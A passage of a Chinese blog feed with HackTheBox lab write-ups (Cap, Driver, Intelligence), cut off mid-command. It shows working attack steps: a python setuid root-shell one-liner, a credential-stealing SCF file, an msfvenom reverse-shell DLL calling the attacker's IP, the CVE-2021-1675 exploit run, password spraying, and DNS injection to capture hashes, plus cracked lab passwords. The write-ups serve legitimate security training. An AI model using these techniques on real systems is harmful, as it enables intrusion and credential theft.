    <content type="html"><![CDATA[<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>端口信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905210023188.png" alt="image-20210905210023188"></p><h2 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h2><p>访问首页的Dashboard，可以看到存在疑似可遍历的id字段：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905200852722.png" alt="image-20210905200852722"></p><p>将id改成0，可以拿到一个数据包。拿到可以看到ftp的用户名和密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905200954452.png" alt="image-20210905200954452"></p><p>使用该账户密码尝试登录<code>ssh</code>，成功：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905201228583.png" alt="image-20210905201228583"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>上传提权辅助脚本<code>linpeas</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905201340853.png" alt="image-20210905201340853"></p><p>运行脚本，观察输出信息后可以发现python3被设置了cap标记，可以用它来帮助我们提权：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905201538863.png" alt="image-20210905201538863"></p><p>在网站 <a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a> 上找到利用的代码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905202209304.png" alt="image-20210905202209304"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./python -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>运行命令后可以拿到root的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Cap.assets/image-20210905202249017.png" alt="image-20210905202249017"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Easy难度的Linux靶机，主要考察内容如下：</p><ul><li>横向越权</li><li>Linux Capabilities利用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Driver</title>
    <link href="/2021/12/07/HTB/Driver/"/>
    <url>/2021/12/07/HTB/Driver/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用nmap对端口信息进行探测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC -p- <span class="hljs-number">10.10.11.106</span>  <br></code></pre></td></tr></table></figure><p>这里注意要扫全端口，否则会漏掉关键的5985端口：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT     STATE SERVICE      VERSION<br><span class="hljs-number">80</span>/tcp   open  http         Microsoft IIS httpd <span class="hljs-number">10.0</span><br>| <span class="hljs-type">http</span>-auth: <br>| <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> Unauthorized\x0D<br>|<span class="hljs-type">_</span>  Basic realm=MFP Firmware Update Center. Please enter password <span class="hljs-keyword">for</span> admin<br>| <span class="hljs-type">http</span>-methods: <br>|   <span class="hljs-type">Supported</span> Methods: OPTIONS TRACE GET HEAD POST<br>|<span class="hljs-type">_</span>  Potentially risky methods: TRACE<br>|<span class="hljs-type">_http</span>-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>|<span class="hljs-type">_http</span>-title: Site doesn&#x27;t have a title (text/html; charset=UTF<span class="hljs-number">-8</span>).<br><span class="hljs-number">135</span>/tcp  open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds Microsoft Windows <span class="hljs-number">7</span> - <span class="hljs-number">10</span> microsoft-ds (workgroup: WORKGROUP)<br><span class="hljs-number">5985</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|<span class="hljs-type">_http</span>-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|<span class="hljs-type">_http</span>-title: Not Found<br>Service <span class="hljs-keyword">Info</span>: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|<span class="hljs-type">_clock</span>-skew: mean: <span class="hljs-number">7</span>h15m00s, deviation: <span class="hljs-number">0</span>s, median: <span class="hljs-number">7</span>h14m59s<br>| <span class="hljs-type">smb</span>-security-mode: <br>|   <span class="hljs-type">authentication_level</span>: user<br>|   <span class="hljs-type">challenge_response</span>: supported<br>|<span class="hljs-type">_</span>  message_signing: disabled (dangerous, but default)<br>| <span class="hljs-type">smb2</span>-security-mode: <br>|   <span class="hljs-type">2</span><span class="hljs-number">.02</span>: <br>|<span class="hljs-type">_</span>    Message signing enabled but not required<br>| <span class="hljs-type">smb2</span>-<span class="hljs-built_in">time</span>: <br>|   <span class="hljs-type">date</span>: <span class="hljs-number">2021</span><span class="hljs-number">-10</span><span class="hljs-number">-24</span>T18:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><br>|<span class="hljs-type">_</span>  start_date: <span class="hljs-number">2021</span><span class="hljs-number">-10</span><span class="hljs-number">-24</span>T04:<span class="hljs-number">13</span>:<span class="hljs-number">17</span><br><br></code></pre></td></tr></table></figure><h1 id="0x02-User-Shell"><a href="#0x02-User-Shell" class="headerlink" title="0x02 User Shell"></a>0x02 User Shell</h1><p>打开网站看看80端口，发现需要验证，使用<code>admin:admin</code>进行登录：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211025184203239.png" alt="image-20211025184203239"></p><p>网站除了一个上传点没啥有用的信息。试着上传文件，发现没有回显。这就比较难办了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211025184314680.png" alt="image-20211025184314680"></p><p>扫目录没有找到上传目录，陷入僵局。回上传界面看看，发现着重强调了一个<code>manually</code>，直觉告诉我这里有些有意思的地方。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024190608247.png" alt="image-20211024190608247"></p><p>去htb的论坛逛了一下，发现有人提到了有个”Windows Specific”的Technique。一通搜索后发现是<a href="https://cloud.tencent.com/developer/article/1028404">SCF攻击</a>。</p><p>构造SCF文件如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Shell]</span><br><span class="hljs-attr">Command</span>=<span class="hljs-number">2</span><br><span class="hljs-attr">IconFile</span>=\\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.33</span>\share\pentestlab.ico<br><span class="hljs-section">[Taskbar]</span><br><span class="hljs-attr">Command</span>=ToggleDesktop<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024191140361.png" alt="image-20211024191140361"></p><p>随后开启Responder，监听VPN的网卡：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024191244645.png" alt="image-20211024191244645"></p><p>将生成的恶意SCF文件上传，不久后就能抓到用户tony的一个NTLMv2 Hash：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024191340790.png" alt="image-20211024191340790"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">tony<span class="hljs-number">::</span>DRIVER:bdf3633cc<span class="hljs-number">1b97438</span>:<span class="hljs-number">083303</span>BDA5669E8318761A18E5A9E23B:<span class="hljs-number">010100000000000080</span>F7C40B0BC9D701FB88FCAB7AD7E8BA0000000002000800360043004700360001001E00570049004E002D00350030003100570044004D0033004F0035003100540004003400570049004E002D00350030003100570044004D0033004F003500310054002E0036004300470036002E004C004F00430041004C000300140036004300470036002E004C004F00430041004C000500140036004300470036002E004C004F00430041004C000700080080F7C40B0BC9D7010600040002000000080030003000000000000000000000000020000078F7201740AA3EEB44B5A2AD11535E46F3CE41F9DCD860C7E13A20E0401BCCC80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330033000000000000000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>使用Hashcat能够爆破出密码为<code>liltony</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024193214113.png" alt="image-20211024193214113"></p><p>使用该用户能够成功访问smb共享，但遗憾的是都没有写的权限：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024193716559.png" alt="image-20211024193716559"></p><p>回论坛又逛了一圈，有师傅提到多看看nmap的结果。遂重新扫了全端口，发现了5985亦即winrm的端口。</p><p>尝试使用msf的winrm利用模块失败了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024200249232.png" alt="image-20211024200249232"></p><p>但是evil-winrm工具可以成功拿到用户的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024203259525.png" alt="image-20211024203259525"></p><h1 id="0x03-Root-Shell"><a href="#0x03-Root-Shell" class="headerlink" title="0x03 Root Shell"></a>0x03 Root Shell</h1><p>之后尝试提权，首先看看用户是否存在可以利用的敏感权限，未果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024204310214.png" alt="image-20211024204310214"></p><p>想来想去这个Box的主题是Driver，然后Web界面提供的功能又是打印机的固件升级，可能突破点和打印机有关？</p><p>于是乎先看看是否有打印机服务，发现存在：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-Service -<span class="hljs-type">Name</span> Spooler<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024204456668.png" alt="image-20211024204456668"></p><p>一通搜索后找到了最近出的一个CVE-2021-1675，它可以利用打印机服务的缺陷进行提权：</p><p>对这个漏洞的复现可参考freebuf的一篇<a href="https://www.freebuf.com/articles/web/279475.html">文章</a>，我们也主要通过这篇文章来操作。</p><p>首先配置smb服务，配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs config">[global]<br>workgroup = workgroup<br>server string = test<br>netbios name = MZ<br>security = user<br>map to guest = Bad User<br>smb ports = 445<br>log file = /var/log/samba/log.%m<br>max log size = 5<br><br>[smb]<br>comment = Samba<br>browseable = yes<br>writeable = yes<br>public = yes<br>path = /tmp/<br>read only = no<br>guest ok = yes<br></code></pre></td></tr></table></figure><p>配置完成后重启smb服务：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">restart</span> smbd.service<br></code></pre></td></tr></table></figure><p>然后使用msfvenom生成木马放在<code>/tmp</code>目录下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.16.34 <span class="hljs-attribute">lport</span>=6666 -f dll -o reverse.dll<br></code></pre></td></tr></table></figure><p>然后使用msf进行的handler进行监听：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024220857121.png" alt="image-20211024220857121"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211024211111395.png" alt="image-20211024211111395"></p><p>之后运行漏洞脚本，稍等即可拿到meterpreter：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span>.py tony:liltony@<span class="hljs-number">10.10.11.106</span> &#x27;\\<span class="hljs-number">10.10.16.34</span>\smb\reverse.dll&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211025145353347.png" alt="image-20211025145353347"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Driver.assets/image-20211025145450103.png" alt="image-20211025145450103"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Easy难度的Windows靶机，主要考察内容如下：</p><ul><li>SCF攻击</li><li>hashcat爆破</li><li>winrm端口利用</li><li>打印机服务利用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Intelligence</title>
    <link href="/2021/12/07/HTB/Intelligence/"/>
    <url>/2021/12/07/HTB/Intelligence/</url>
    
    <content type="html"><![CDATA[<p>待<a href="https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html">完善</a>。。。</p><h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用nmap对靶机进行探测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC <span class="hljs-number">10.10.10.248</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20210930211850122.png" alt="image-20210930211850122"></p><p>比较标准的DC端口，还多了个WEB的80。</p><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>进WEB看看，发现在主页目录可以下载文档。主页能下载的文档文件名为<code>2020-01-01-upload.pdf</code></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008103916590.png" alt="image-20211008103916590"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104103851.png" alt="image-20211008104103851"></p><p>遂写了脚本进行爆破，将所有的文档下载下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> month <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>):<br>    <span class="hljs-keyword">for</span> day <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>        file_name = <span class="hljs-string">&quot;2020-%02d-%02d-upload.pdf&quot;</span> % (month, day)<br>        resp = requests.get(<span class="hljs-string">&quot;http://10.10.10.248/documents/&quot;</span> + file_name)<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(file_name)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(resp.content)<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104214464.png" alt="image-20211008104214464"></p><p>其中，大多数文档都是无意义的填充文字，为了避免一个个看过去，写了个脚本提取文字：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 安装  pip install pdfplumber</span><br><span class="hljs-keyword">import</span> pdfplumber<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># 利用pdfplumber提取文字</span><br>file = sys.argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> pdfplumber.<span class="hljs-built_in">open</span>(file) <span class="hljs-keyword">as</span> pdf:<br>    first_page = pdf.pages[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(file)<br>    <span class="hljs-built_in">print</span>(first_page.extract_text())<br>    <span class="hljs-built_in">print</span>()     <br></code></pre></td></tr></table></figure><p>将脚本保存为<code>extract.py</code>，该脚本使用方式为<code>python3 extract.py 2020-01-01-upload.pdf </code>，为了批量处理需要配合shell命令进行使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> | grep pdf) ; <span class="hljs-keyword">do</span> python3 extract.py  <span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span> &gt; text_extract.txt<br></code></pre></td></tr></table></figure><p>查看提取出的文字，对一些字段进行搜索，可以看到在搜索pass时能够看到初始密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001110440842.png" alt="image-20211001110440842"></p><p>有了密码，我们还需要用户名才能进行登录，使用工具<code>exiftool</code>查看用户名：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104808719.png" alt="image-20211008104808719"></p><p><code>2020-06-04-upload.pdf</code>的用户名不能登陆，所以我们需要提取所有的用户名：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ls</span>) ; <span class="hljs-keyword">do</span> exiftool <span class="hljs-variable">$i</span>| grep Creator |awk <span class="hljs-operator">-F</span>: <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>; done<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008105032513.png" alt="image-20211008105032513"></p><p>将所有的用户名保存为username.txt，使用crackmapexec进行密码喷洒攻击：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">10.10.10.248</span> -u username.txt -p <span class="hljs-string">&quot;NewIntelligenceCorpUser9876&quot;</span> <br></code></pre></td></tr></table></figure><p>最终爆破得到如下信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001124730527.png" alt="image-20211001124730527"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">domain</span> <span class="hljs-operator">=</span> intelligence.htb<br><span class="hljs-attribute">username</span> <span class="hljs-operator">=</span> Tiffany.Molina<br><span class="hljs-attribute">password</span> <span class="hljs-operator">=</span> NewIntelligenceCorpUser9876<br></code></pre></td></tr></table></figure><p>连上smb翻一下文件，能够找到一个downdetector.ps1，我们将这个文件下载下来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient -L <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> -U Tiffany.Molina<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─root@kali ~/下载/pdf <br>╰─<span class="hljs-comment"># smbclient -L //10.10.10.248 -U Tiffany.Molina</span><br>Enter WORKGROUP\Tiffany.Molina<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sharename       Type      Comment</span><br><span class="hljs-string">---------       ----      -------</span><br><span class="hljs-string">ADMIN$          Disk      Remote Admin</span><br><span class="hljs-string">C$              Disk      Default share</span><br><span class="hljs-string">IPC$            IPC       Remote IPC</span><br><span class="hljs-string">IT              Disk      </span><br><span class="hljs-string">NETLOGON        Disk      Logon server share </span><br><span class="hljs-string">SYSVOL          Disk      Logon server share </span><br><span class="hljs-string">Users           Disk      </span><br><span class="hljs-string">SMB1 disabled -- no workgroup available</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╭─root@kali ~/下载/pdf </span><br><span class="hljs-string">╰─# smbclient  //10.10.10.248/IT -U Tiffany.Molina</span><br><span class="hljs-string">Enter WORKGROUP\Tiffany.Molina&#x27;</span>s password: <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Mon Apr 19 08:50:55 2021<br>  ..                                  D        0  Mon Apr 19 08:50:55 2021<br>  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021<br><br>3770367 blocks of size 4096. 1460376 blocks available<br>smb: \&gt; get downdetector.ps1<br>getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)<br><br><br><br>╭─root@kali ~/下载/pdf <br>╰─<span class="hljs-comment"># smbclient  //10.10.10.248/Users -U Tiffany.Molina</span><br>Enter WORKGROUP\Tiffany.Molina<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; get Tiffany.Molina\Desktop\user.txt</span><br><span class="hljs-string">getting file \Tiffany.Molina\Desktop\user.txt of size 34 as Tiffany.Molina\Desktop\user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br></code></pre></td></tr></table></figure><p>然后顺手拿个user的flag：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001130336719.png" alt="image-20211001130336719"></p><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>查看downdetector.ps1，内容如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Check web server status. Scheduled to run every 5min</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$record</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="hljs-built_in">Where-Object</span> Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;web*&quot;</span>)  &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$request</span> = <span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> <span class="hljs-string">&quot;http://<span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name)&quot;</span> <span class="hljs-literal">-UseDefaultCredentials</span><br><span class="hljs-keyword">if</span>(.StatusCode <span class="hljs-operator">-ne</span> <span class="hljs-number">200</span>) &#123;<br><span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-From</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-To</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host: <span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name) is down&quot;</span><br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结合文件名，我们可以推测该脚本的作用。每五分钟，该脚本会查找以“web”开头的域内二级站点，并使用<code>Ted</code>的凭据为每条找到的记录发送HTTP请求。(使用<code>-UseDefaultCredentials</code>选项)如果服务器没有返回200 OK状态码，则会向<code>Ted</code>发送一封邮件。</p><p>发送邮件不是我们关心的内容，重要的是HTTP请求带上了用户的凭据信息，我们可以插入一条相对应的DNS记录，指向自己的机子，这样就能拿到Ted.Graves的凭据信息了：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> dnstool.py -u <span class="hljs-string">&#x27;intelligence.htb\Tiffany.Molina&#x27;</span> -p <span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span> -a add -r <span class="hljs-string">&#x27;websucks.intelligence.htb&#x27;</span> -d <span class="hljs-number">10.10.14.27</span> <span class="hljs-number">10.10.10.248</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005161234902.png" alt="image-20211005161234902"></p><p>之后开启responder，监听vpn的网卡，等最多5分钟就能拿到Ted.Graves的NTLMv2 Hash：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005161628128.png" alt="image-20211005161628128"></p><p>使用netcat进行爆破，最后能够拿到Ted.Graves的密码为Mr.Teddy：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> 